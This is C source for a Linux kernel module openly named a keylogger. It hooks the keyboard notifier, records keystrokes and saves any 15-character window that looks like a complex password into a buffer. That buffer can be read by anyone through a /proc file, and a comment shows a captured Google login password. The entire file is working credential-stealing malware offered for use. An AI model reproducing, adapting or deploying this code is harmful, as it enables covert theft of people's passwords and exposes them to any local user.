/*
    Example login capture from google:

    silas@silas-ubuntu:~/Documents/c++/keylogger$ sudo insmod keylogger.ko
    silas@silas-ubuntu:~/Documents/c++/keylogger$ cat /proc/potential_passwords
    --- Last 100 Potential Passwords ---
    [01] in Password#123
    [02] min Password#12
    [03] dmin Password#1
    [04] admin Password#
    silas@silas-ubuntu:~/Documents/c++/keylogger$
*/

#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/ctype.h>

MODULE_DESCRIPTION("Linux Kernel Keylogger");
MODULE_AUTHOR("Silas");
MODULE_LICENSE("GPL");

#define SLIDING_BUFFER_WINDOW_SIZE 15 // Defines how many characters we want in our sliding buffer while capturing passwords.
#define MAX_STORED_PASSWORDS 100 // The max number of passwords that our file will store.

// Stores the last captured password 
struct capturedPassword 
{
    char str[SLIDING_BUFFER_WINDOW_SIZE + 1];
};

static struct capturedPassword storedPasswords[MAX_STORED_PASSWORDS]; // Circular buffer for captured strings
static int head = 0; // Current index
static char slidingCharacterBuffer[SLIDING_BUFFER_WINDOW_SIZE + 1];

// Mapping tables for both unshifted and shifted text
static const char *keyPressed = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`..zxcvbnm,./";
static const char *keyPressedShifted = "..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"~..ZXCVBNM<>?";

// Checks to see if our sliding window buffer is complex
bool isComplex(const char *s) 
{
    int lower = 0, upper = 0, digit = 0, symbol = 0;
    int i;
    for (i = 0; i < SLIDING_BUFFER_WINDOW_SIZE; i++) 
    {
        if (islower(s[i])) lower = 1;
        else if (isupper(s[i])) upper = 1;
        else if (isdigit(s[i])) digit = 1;
        else if (ispunct(s[i])) symbol = 1;
    };
    return (lower + upper + digit + symbol) >= 3;
};

// Processes every keystroke and checks for potential passwords
int capturedKeyHandeler(struct notifier_block *nb, unsigned long code, void *_param) 
{
    struct keyboard_notifier_param *param = _param;

    // Checks to make sure the program only captures the down motion on the keyboard
    if (code == KBD_KEYCODE && param->down) 
    {
        char c = '\0';
        bool shifted = (param->shift & (1 << KG_SHIFT));

        // Translates keycodes into human readable text
        if (param->value < 54) 
        {
            c = shifted ? keyPressedShifted[param->value] : keyPressed[param->value]; // Checks to see if the key was shifted or not
        } else if (param->value == 57) 
        {
            c = ' ';
        };

        if (c != '\0' && c != '.') 
        {
            memmove(slidingCharacterBuffer, slidingCharacterBuffer + 1, SLIDING_BUFFER_WINDOW_SIZE - 1);
            slidingCharacterBuffer[SLIDING_BUFFER_WINDOW_SIZE - 1] = c;
            slidingCharacterBuffer[SLIDING_BUFFER_WINDOW_SIZE] = '\0';

            if (isComplex(slidingCharacterBuffer)) 
            {
                strncpy(storedPasswords[head].str, slidingCharacterBuffer, SLIDING_BUFFER_WINDOW_SIZE);
                storedPasswords[head].str[SLIDING_BUFFER_WINDOW_SIZE] = '\0';
                head = (head + 1) % MAX_STORED_PASSWORDS;
            };
        };
    };
    return NOTIFY_OK;
};

static struct notifier_block nb = { .notifier_call = capturedKeyHandeler };

// Formats text into /proc
static int show_logs(struct seq_file *m, void *v) 
{
    int i;
    seq_printf(m, "--- Last 100 Potential Passwords ---\n");
    for (i = 0; i < MAX_STORED_PASSWORDS; i++) 
    {
        int idx = (head - 1 - i + MAX_STORED_PASSWORDS) % MAX_STORED_PASSWORDS;
        if (storedPasswords[idx].str[0] != '\0') 
        {
            seq_printf(m, "[%02d] %s\n", i + 1, storedPasswords[idx].str);
        };
    };
    return 0;
};

// Proc
static int open_proc(struct inode *inode, struct file *file) 
{
    return single_open(file, show_logs, NULL);
};

static const struct proc_ops p_ops = 
{
    .proc_open = open_proc,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

// Module entry
static int __init keylogger_init(void) 
{
    memset(storedPasswords, 0, sizeof(storedPasswords));
    memset(slidingCharacterBuffer, ' ', SLIDING_BUFFER_WINDOW_SIZE); 
    slidingCharacterBuffer[SLIDING_BUFFER_WINDOW_SIZE] = '\0';
    register_keyboard_notifier(&nb);
    proc_create("potential_passwords", 0444, NULL, &p_ops);
    return 0;
};

// Module exit
static void __exit keylogger_exit(void) 
{
    unregister_keyboard_notifier(&nb);
    remove_proc_entry("potential_passwords", NULL);
};

module_init(keylogger_init);
module_exit(keylogger_exit);